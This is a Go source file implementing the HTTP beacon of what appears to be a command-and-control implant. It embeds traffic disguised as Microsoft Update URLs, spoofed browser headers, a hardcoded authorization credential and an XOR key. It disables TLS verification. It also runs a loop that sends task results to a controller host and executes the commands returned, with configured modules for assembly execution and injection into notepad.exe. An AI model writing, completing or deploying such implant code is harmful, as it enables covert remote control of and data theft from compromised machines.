package beacon

import (
	"crypto/tls"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"strings"
	"time"
)

const (
	defaultHTTPScheme       = "http"
	defaultHTTPSScheme      = "https"
	defaultEndpointFallback = "/MicrosoftUpdate/ShellEx/KB242742/default.aspx"
	defaultContentType      = "text/plain;charset=UTF-8"
	headerContentType       = "Content-Type"
	defaultRootEndpoint     = "/"
	configKeyXOR            = "xorKey"
	configKeyListenerHTTPS  = "ListenerHttpsConfig"
	configKeyListenerHTTP   = "ListenerHttpConfig"
	configKeyURI            = "uri"
	configKeyClient         = "client"
	configKeyHeaders        = "headers"
	errorMissingArgument    = "Error: missing argument"
)

const configJSON = `
{
    "DomainName": "",
    "ExposedIp": "",
    "xorKey": "dfsdgferhzdzxczevre5595485sdg",
    "ListenerHttpConfig": {
        "uri": [
            "/MicrosoftUpdate/ShellEx/KB242742/default.aspx",
            "/MicrosoftUpdate/ShellEx/KB242742/admin.aspx",
            "/MicrosoftUpdate/ShellEx/KB242742/download.aspx"
        ],
        "client": {
            "headers": {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
                "Connection": "Keep-Alive",
                "Content-Type": "text/plain;charset=UTF-8",
                "Content-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
                "Authorization": "YWRtaW46c2RGSGVmODQvZkg3QWMtIQ==",
                "Keep-Alive": "timeout=5, max=1000",
                "Cookie": "PHPSESSID=298zf09hf012fh2; csrftoken=u32t4o3tb3gg43; _gat=1",
                "Accept": "*/*",
                "Sec-Ch-Ua": "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"",
                "Sec-Ch-Ua-Platform": "Windows"
            }
        }
    },
    "ListenerHttpsConfig": {
        "uri": [
            "/MicrosoftUpdate/ShellEx/KB242742/default.aspx",
            "/MicrosoftUpdate/ShellEx/KB242742/upload.aspx",
            "/MicrosoftUpdate/ShellEx/KB242742/config.aspx"
        ],
        "client": {
            "headers": {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
                "Connection": "Keep-Alive",
                "Content-Type": "text/plain;charset=UTF-8",
                "Content-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
                "Authorization": "YWRtaW46c2RGSGVmODQvZkg3QWMtIQ==",
                "Keep-Alive": "timeout=5, max=1000",
                "Cookie": "PHPSESSID=298zf09hf012fh2; csrftoken=u32t4o3tb3gg43; _gat=1",
                "Accept": "*/*",
                "Sec-Ch-Ua": "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"",
                "Sec-Ch-Ua-Platform": "Windows"
            }
        }
    },
    "ModulesConfig": {
        "assemblyExec": {
            "process": "notepad.exe",
            "test": "test"
        },
        "inject": {
            "process": "notepad.exe",
            "test": "test"
        },
        "toto": {
            "process": "test",
            "test": "test"
        }
    }
}
`

// loadConfigFromConst parses the embedded JSON configuration.
func loadConfigFromConst() (map[string]any, error) {
	var cfg map[string]any
	if err := json.Unmarshal([]byte(configJSON), &cfg); err != nil {
		return nil, err
	}
	return cfg, nil
}

// BeaconHTTP extends Beacon with HTTP communication helpers.
type BeaconHTTP struct {
	*Beacon

	host    string
	port    string
	scheme  string
	isHTTPS bool

	headers map[string]string
	uris    []string

	client *http.Client
}

// NewBeaconHTTP constructs a BeaconHTTP configured for the provided endpoint.
func NewBeaconHTTP(host, port, scheme string) (*BeaconHTTP, error) {
	if host == "" || port == "" || scheme == "" {
		return nil, errors.New(errorMissingArgument)
	}

	beacon := NewBeacon()
	httpBeacon := &BeaconHTTP{
		Beacon:  beacon,
		host:    host,
		port:    port,
		scheme:  strings.ToLower(scheme),
		headers: make(map[string]string),
	}

	httpBeacon.isHTTPS = httpBeacon.scheme == defaultHTTPSScheme
	if httpBeacon.isHTTPS {
		httpBeacon.scheme = defaultHTTPSScheme
	} else {
		httpBeacon.scheme = defaultHTTPScheme
	}

	cfg, err := loadConfigFromConst()
	if err != nil {
		return nil, err
	}

	if xorKey, _ := cfg[configKeyXOR].(string); xorKey != "" {
		httpBeacon.SetXORKey(xorKey)
	}

	listenerKey := configKeyListenerHTTP
	if httpBeacon.isHTTPS {
		listenerKey = configKeyListenerHTTPS
	}

	listenerCfg, _ := cfg[listenerKey].(map[string]any)
	httpBeacon.uris = extractURIs(listenerCfg)
	httpBeacon.headers = extractHeaders(listenerCfg)
	if _, ok := httpBeacon.headers[headerContentType]; !ok {
		httpBeacon.headers[headerContentType] = defaultContentType
	}

	transport := &http.Transport{}
	if httpBeacon.isHTTPS {
		transport.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	}
	httpBeacon.client = &http.Client{Transport: transport, Timeout: 15 * time.Second}

	return httpBeacon, nil
}

func extractURIs(listener map[string]any) []string {
	if listener == nil {
		return []string{defaultEndpointFallback}
	}
	cfgURIs, _ := listener[configKeyURI].([]any)
	var uris []string
	for _, uri := range cfgURIs {
		if s, ok := uri.(string); ok && s != "" {
			uris = append(uris, s)
		}
	}
	if len(uris) == 0 {
		uris = []string{defaultEndpointFallback}
	}
	return uris
}

func extractHeaders(listener map[string]any) map[string]string {
	headers := make(map[string]string)
	if listener == nil {
		headers[headerContentType] = defaultContentType
		return headers
	}
	client, _ := listener[configKeyClient].(map[string]any)
	headerMap, _ := client[configKeyHeaders].(map[string]any)
	for k, v := range headerMap {
		if str, ok := v.(string); ok {
			headers[k] = str
		}
	}
	if len(headers) == 0 {
		headers[headerContentType] = defaultContentType
	}
	return headers
}

// CheckIn sends the current task results to the controller and retrieves new tasks.
func (b *BeaconHTTP) CheckIn() {
	payload := b.SerializeTaskResults()
	endpoint := b.pickEndpoint()
	url := fmt.Sprintf("%s://%s:%s%s", b.scheme, b.host, b.port, endpoint)

	req, err := http.NewRequest(http.MethodPost, url, strings.NewReader(payload))
	if err != nil {
		return
	}
	for key, value := range b.headers {
		req.Header.Set(key, value)
	}

	resp, err := b.client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return
	}
	data := strings.TrimSpace(string(body))
	if data == "" {
		return
	}
	b.CmdToTasks(data)
}

func (b *BeaconHTTP) pickEndpoint() string {
	if len(b.uris) == 0 {
		return defaultRootEndpoint
	}
	uri := b.uris[rand.Intn(len(b.uris))]
	if !strings.HasPrefix(uri, defaultRootEndpoint) {
		uri = defaultRootEndpoint + uri
	}
	return uri
}

// RunTasks executes retrieved tasks.
func (b *BeaconHTTP) RunTasks() {
	b.ExecInstruction()
}

// SleepDuration returns the beacon sleep interval.
func (b *BeaconHTTP) SleepDuration() time.Duration {
	return time.Duration(b.SleepTimeMS) * time.Millisecond
}

// Run is a helper that performs continuous check-in loops.
func (b *BeaconHTTP) Run() {
	for {
		b.CheckIn()
		b.RunTasks()
		time.Sleep(b.SleepDuration())
	}
}

// ParseArgs validates command-line arguments for the CLI entry point.
func ParseArgs(args []string) (string, string, string, error) {
	if len(args) < 3 {
		return "", "", "", errors.New(errorMissingArgument)
	}
	return args[0], args[1], args[2], nil
}
